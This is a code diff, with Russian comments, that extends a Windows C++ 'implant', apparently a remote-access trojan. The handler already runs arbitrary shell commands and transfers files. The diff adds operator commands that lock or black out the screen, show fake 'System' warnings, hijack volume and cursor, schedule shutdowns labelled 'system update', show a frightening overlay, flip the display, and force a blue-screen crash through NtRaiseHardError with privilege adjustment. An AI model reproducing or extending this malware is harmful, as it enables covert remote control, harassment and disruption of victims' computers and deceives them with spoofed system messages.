@@ -1,4 +1,3 @@
-// language: C++, file: implant.cpp, target: Windows x64, MinGW
 #define NOMINMAX
 #include <windows.h>
 #include <winhttp.h>
@@ -7,6 +6,9 @@
 #include <sstream>
 #include <random>
 #include <algorithm>
+#include <cstring>
+#include <mmsystem.h>
+#pragma comment(lib, "winmm.lib")
 
 static std::string AppDataPath() {
     char p[MAX_PATH]{};
@@ -143,7 +145,11 @@ static std::string RunCmd(const std::string& cmd) {
     return out;
 }
 
-static std::string HandleSpecial(const std::string& cmd, std::string& extra) {
+static std::string HandleSpecial(const std::string& cmdIn, std::string& extra) {
+    std::string cmd = cmdIn;
+    while (!cmd.empty() && cmd.back() == ' ') cmd.pop_back();
+
+    // --- файлы ---
     if (cmd.rfind("get ", 0) == 0) {
         std::string path = cmd.substr(4);
         std::string data = ReadFile(path);
@@ -160,6 +166,191 @@ static std::string HandleSpecial(const std::string& cmd, std::string& extra) {
         WriteFileRaw(path, raw);
         return "[+] wrote " + std::to_string(raw.size()) + " bytes to " + path;
     }
+
+    // --- управление экраном / системой ---
+    if (cmd == "screen_off") {
+        SendMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, 2);
+        return "[+] screen off";
+    }
+    if (cmd == "screen_on") {
+        SendMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, -1);
+        return "[+] screen on";
+    }
+    if (cmd == "lock") {
+        LockWorkStation();
+        return "[+] locked";
+    }
+    if (cmd == "beep") {
+        Beep(1000, 500);
+        return "[+] beep";
+    }
+    if (cmd.rfind("msg ", 0) == 0) {
+        std::string text = cmd.substr(4);
+        MessageBoxA(nullptr, text.c_str(), "System",
+                    MB_OK | MB_ICONWARNING | MB_TOPMOST);
+        return "[+] message shown";
+    }
+    if (cmd == "mute" || cmd == "unmute") {
+        keybd_event(VK_VOLUME_MUTE, 0, 0, 0);
+        keybd_event(VK_VOLUME_MUTE, 0, KEYEVENTF_KEYUP, 0);
+        return "[+] mute toggled";
+    }
+    if (cmd == "vol_max") {
+        for (int i = 0; i < 50; ++i) {
+            keybd_event(VK_VOLUME_UP, 0, 0, 0);
+            keybd_event(VK_VOLUME_UP, 0, KEYEVENTF_KEYUP, 0);
+        }
+        return "[+] volume max";
+    }
+    if (cmd == "vol_0") {
+        for (int i = 0; i < 50; ++i) {
+            keybd_event(VK_VOLUME_DOWN, 0, 0, 0);
+            keybd_event(VK_VOLUME_DOWN, 0, KEYEVENTF_KEYUP, 0);
+        }
+        return "[+] volume 0";
+    }
+    if (cmd == "vol_50") {
+        for (int i = 0; i < 50; ++i) {
+            keybd_event(VK_VOLUME_DOWN, 0, 0, 0);
+            keybd_event(VK_VOLUME_DOWN, 0, KEYEVENTF_KEYUP, 0);
+        }
+        for (int i = 0; i < 25; ++i) {
+            keybd_event(VK_VOLUME_UP, 0, 0, 0);
+            keybd_event(VK_VOLUME_UP, 0, KEYEVENTF_KEYUP, 0);
+        }
+        return "[+] volume 50";
+    }
+    if (cmd == "shutdown") {
+        system("shutdown /s /t 30 /c \"system update\"");
+        return "[+] shutdown in 30s";
+    }
+    if (cmd == "restart") {
+        system("shutdown /r /t 30 /c \"system update\"");
+        return "[+] restart in 30s";
+    }
+    if (cmd == "cancel") {
+        system("shutdown /a");
+        return "[+] shutdown canceled";
+    }
+    if (cmd == "scare") {
+        for (int i = 0; i < 50; ++i) {
+            keybd_event(VK_VOLUME_UP, 0, 0, 0);
+            keybd_event(VK_VOLUME_UP, 0, KEYEVENTF_KEYUP, 0);
+        }
+        Beep(2000, 2000);
+        HWND h = CreateWindowExW(WS_EX_TOPMOST | WS_EX_LAYERED, L"STATIC",
+            L"", WS_POPUP | WS_VISIBLE, 0, 0,
+            GetSystemMetrics(SM_CXSCREEN), GetSystemMetrics(SM_CYSCREEN),
+            nullptr, nullptr, nullptr, nullptr);
+        if (h) {
+            SetLayeredWindowAttributes(h, 0, 240, LWA_ALPHA);
+            HDC dc = GetDC(h);
+            RECT r; GetClientRect(h, &r);
+            HBRUSH br = CreateSolidBrush(RGB(0, 0, 0));
+            FillRect(dc, &r, br);
+            DeleteObject(br);
+            SetTextColor(dc, RGB(255, 0, 0));
+            SetBkMode(dc, TRANSPARENT);
+            HFONT f = CreateFontW(140, 0, 0, 0, FW_BOLD, 0, 0, 0,
+                DEFAULT_CHARSET, 0, 0, 0, 0, L"Impact");
+            SelectObject(dc, f);
+            const wchar_t* m = L"BOO!";
+            DrawTextW(dc, m, -1, &r, DT_CENTER | DT_VCENTER | DT_SINGLELINE);
+            ReleaseDC(h, dc);
+            Sleep(5000);
+            DestroyWindow(h);
+            DeleteObject(f);
+        }
+        return "[+] scare done";
+    }
+    if (cmd == "wall") {
+        HWND h = CreateWindowExW(WS_EX_TOPMOST | WS_EX_LAYERED, L"STATIC",
+            L"", WS_POPUP | WS_VISIBLE, 0, 0,
+            GetSystemMetrics(SM_CXSCREEN), GetSystemMetrics(SM_CYSCREEN),
+            nullptr, nullptr, nullptr, nullptr);
+        if (h) {
+            SetLayeredWindowAttributes(h, 0, 200, LWA_ALPHA);
+            HDC dc = GetDC(h);
+            RECT r; GetClientRect(h, &r);
+            HBRUSH br = CreateSolidBrush(RGB(30, 0, 60));
+            FillRect(dc, &r, br);
+            DeleteObject(br);
+            SetTextColor(dc, RGB(255, 255, 255));
+            SetBkMode(dc, TRANSPARENT);
+            HFONT f = CreateFontW(80, 0, 0, 0, FW_BOLD, 0, 0, 0,
+                DEFAULT_CHARSET, 0, 0, 0, 0, L"Arial");
+            SelectObject(dc, f);
+            const wchar_t* m = L"hello from winlator";
+            DrawTextW(dc, m, -1, &r, DT_CENTER | DT_VCENTER | DT_SINGLELINE);
+            ReleaseDC(h, dc);
+            Sleep(5000);
+            DestroyWindow(h);
+            DeleteObject(f);
+        }
+        return "[+] wall shown";
+    }
+    if (cmd == "party") {
+        for (int i = 0; i < 30; ++i) {
+            POINT p;
+            p.x = (rand() % GetSystemMetrics(SM_CXSCREEN));
+            p.y = (rand() % GetSystemMetrics(SM_CYSCREEN));
+            SetCursorPos(p.x, p.y);
+            Beep(500 + (rand() % 2000), 100);
+            Sleep(100);
+        }
+        return "[+] party done";
+    }
+    if (cmd == "bsod") {
+        // требует SeShutdownPrivilege — обычно есть у пользователя
+        typedef LONG (WINAPI *pNtRaiseHardError)(LONG, ULONG, ULONG,
+            PVOID, ULONG, PULONG);
+        typedef LONG (WINAPI *pRtlAdjustPrivilege)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
+        HMODULE ntdll = LoadLibraryA("ntdll.dll");
+        if (ntdll) {
+            auto RtlAdj = (pRtlAdjustPrivilege)GetProcAddress(ntdll, "RtlAdjustPrivilege");
+            auto NtErr  = (pNtRaiseHardError)GetProcAddress(ntdll, "NtRaiseHardError");
+            if (RtlAdj && NtErr) {
+                BOOLEAN old;
+                RtlAdj(19, TRUE, FALSE, &old);   // SeShutdownPrivilege
+                ULONG resp;
+                NtErr(0xC0000005, 0, 0, nullptr, 6, &resp);
+            }
+        }
+        return "[+] bsod triggered";
+    }
+    if (cmd == "flip") {
+        DEVMODE dm{};
+        dm.dmSize = sizeof(dm);
+        EnumDisplaySettings(nullptr, ENUM_CURRENT_SETTINGS, &dm);
+        dm.dmDisplayOrientation = DMDO_180;
+        dm.dmFields = DM_DISPLAYORIENTATION;
+        ChangeDisplaySettings(&dm, 0);
+        return "[+] screen flipped";
+    }
+    if (cmd == "flip_reset") {
+        DEVMODE dm{};
+        dm.dmSize = sizeof(dm);
+        EnumDisplaySettings(nullptr, ENUM_CURRENT_SETTINGS, &dm);
+        dm.dmDisplayOrientation = DMDO_DEFAULT;
+        dm.dmFields = DM_DISPLAYORIENTATION;
+        ChangeDisplaySettings(&dm, 0);
+        return "[+] orientation reset";
+    }
+    if (cmd == "cursor_hide") {
+        ShowCursor(FALSE);
+        return "[+] cursor hidden";
+    }
+    if (cmd == "cursor_show") {
+        while (ShowCursor(TRUE) < 0) {}
+        return "[+] cursor shown";
+    }
+    if (cmd.rfind("open ", 0) == 0) {
+        ShellExecuteA(nullptr, "open", cmd.substr(5).c_str(),
+                      nullptr, nullptr, SW_SHOW);
+        return "[+] opened";
+    }
+
+    // обычная cmd-команда
     return RunCmd(cmd);
 }
 
